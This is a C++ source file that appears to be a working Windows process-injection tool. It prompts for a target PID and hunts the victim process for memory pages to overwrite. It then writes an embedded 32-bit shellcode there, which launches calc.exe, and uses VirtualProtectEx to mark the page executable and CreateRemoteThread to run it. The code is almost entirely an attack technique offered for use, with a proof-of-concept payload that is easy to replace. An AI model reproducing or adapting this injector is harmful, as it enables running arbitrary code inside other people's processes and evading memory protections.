
#include<iostream>
#include<windows.h>
#include<cstdlib>
using namespace std;

//executes shellcode in any section of a process and takes over
//works on only 32 bit processes**********************

char shellcode[]="\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";
//CALC EXE SHELLCODE


void Exec(LPVOID address,DWORD proc_id)
{
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc_id);        //open target process
    
    if(WriteProcessMemory(procHandle,address,shellcode,sizeof(shellcode),0))    
    //write directly to page found in hunt function
        cout<<"written"<<endl;
    else
        cout<<GetLastError()<<endl;

    DWORD prev;
    

    if(VirtualProtectEx(procHandle,address,sizeof(shellcode),PAGE_EXECUTE_READWRITE,&prev))
    //change memory section to executable for shellcode
        cout<<"Changed protection flags..."<<endl;
    else
        printf("0x%x",GetLastError());

    LPVOID hThread = CreateRemoteThread(procHandle, 0, 0, (LPTHREAD_START_ROUTINE)(address), 0, 0, 0);
    //execute shellcode

    if(hThread)
        cout<<"spawned thread"<<endl;

    //WaitForSingleObject(hThread,INFINITE);

    printf("DONE\n");
}



LPVOID WINAPI Hunt(DWORD pid){          //look for eligible pages to attack
    
    cout<<pid<<endl;
    HANDLE victim_proc=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pid);       //opens victim process

    if(victim_proc)
        cout<<"opened"<<endl;


    long MaxAddress = 0x7fffffff;           //start from address 0 to look for eligible pages
	unsigned long address = 0;
	do
	{
        
		MEMORY_BASIC_INFORMATION m;
		int result = VirtualQueryEx(victim_proc, (LPVOID)address, &m, sizeof(MEMORY_BASIC_INFORMATION));
        //query info for every page one by one in loop

		if (m.State==MEM_COMMIT and ((m.AllocationProtect & PAGE_NOACCESS) || (m.AllocationProtect & PAGE_GUARD)) )
        //CAN USE PAGE_EXECUTE_READWRITE TO HUNT FOR RWX PAGES
        //used to choose eligible pages
		{
			printf("RW found at 0x%x and region size is %ld\n", m.BaseAddress,(long)m.BaseAddress + (long)m.RegionSize);
			return m.BaseAddress;
		}

		if (address == (long)m.BaseAddress + (long)m.RegionSize)
			break;

		address = (long)m.BaseAddress + (long)m.RegionSize;       //add page base addr and page size to go to next page

	} while (address <= MaxAddress);

    CloseHandle(victim_proc);

    return 0;
}


int main()
{
    int pid;
    cout<<"Enter pid: ";
    cin>>pid;
    LPVOID addr=Hunt(pid);

    Exec(addr,pid);
}
